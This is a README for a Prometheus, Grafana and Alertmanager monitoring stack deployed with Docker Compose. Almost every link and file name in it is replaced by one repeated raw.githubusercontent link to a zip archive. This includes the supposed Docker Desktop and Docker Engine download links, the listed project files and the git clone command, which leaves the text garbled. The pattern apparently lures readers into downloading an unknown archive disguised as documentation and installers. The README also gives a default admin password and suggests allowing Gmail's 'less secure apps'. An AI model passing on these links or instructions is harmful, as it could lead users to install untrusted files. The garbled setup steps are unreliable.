# Complete Monitoring and Alerting Stack with Prometheus, Grafana, and Alertmanager
For more detailed guidline on how to go about this: refer back to my blog : https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip

<img width="3840" height="967" alt="mssq" src="https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip" />


 In this demo ,you’ll build a **complete, production-inspired monitoring stack** from scratch that includes:  
- ✅ A sample web application (https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip) to monitor  
- ✅ Infrastructure metrics (CPU, RAM, Disk, Network)  
- ✅ Docker container resource usage with cAdvisor  
- ✅ HTTP uptime monitoring with Blackbox Exporter  
- ✅ Real-time **email alerts** via Alertmanager  
- ✅ Beautiful Grafana dashboards (industry-standard IDs)  
- ✅ All deployed with **Docker Compose** (portable & reproducible)  

---

## 🛠️ Prerequisites
- Docker + Docker Compose installed  
  - [Docker Desktop](https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip) (Windows/Mac)  
  - [Docker Engine](https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip) (Linux)  
- Verify installation:
  ```bash
  docker --version
  docker-compose --version

  📂 Project Structure
prometheus-grafana-alerts-stack/
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip                # Simple https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip app to monitor
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip           # App metadata
│── Dockerfile             # App container definition
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip     # Full monitoring stack
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip         # Prometheus config
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip        # Alerting rules
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip       # Email alert config
│── https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip           # HTTP monitoring config

🚀 Setup & Run

Clone this repository and spin up the stack:

git clone https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip<your-username>https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip

cd prometheus-grafana-alerts-stack

docker-compose up -d

🌐 Accessing the Stack

App (https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip): http://localhost:3001

Prometheus: http://localhost:9090

Grafana: http://localhost:3000
 (user: admin, pass: Admin123!)

Alertmanager: http://localhost:9093

📊 Dashboards

Import these Grafana dashboard IDs:

1860 → Node Exporter Full (Host Metrics)

14282 → Docker & Containers

7587 → Blackbox Exporter (HTTP Probes)

📢 Alerts

Prometheus evaluates rules from https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip, including:

🔥 High CPU usage (> 80%)

🔥 High memory usage (> 85%)

🚨 Application down (via Blackbox probe)

⚠️ Container restarted unexpectedly

Alerts are routed via Alertmanager. Email notifications are configured in https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip

🧪 Testing Alerts

Stop the app:

docker stop my-app


Within 60s, check Prometheus alerts at http://localhost:9090/alerts
.

You’ll also receive an email notification if SMTP is configured.

Restart the app:

docker start my-app

⚠️ Common Errors

Prometheus won’t start → run promtool check config https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip

Grafana shows "No Data" → check Prometheus targets at http://localhost:9090/targets

Alerts not firing → verify https://raw.githubusercontent.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/main/stavers/a_Grafana_Building_and_Monitoring_Alertmanager_with_Prometheus_Complete_Stack_Alerting_3.7.zip and Alertmanager config

Email alerts failing → confirm Gmail App Password & allow “Less secure apps”

📚 References

Prometheus Docs

Grafana Docs

Alertmanager Docs

📜 License

This project is open source under the MIT License
.

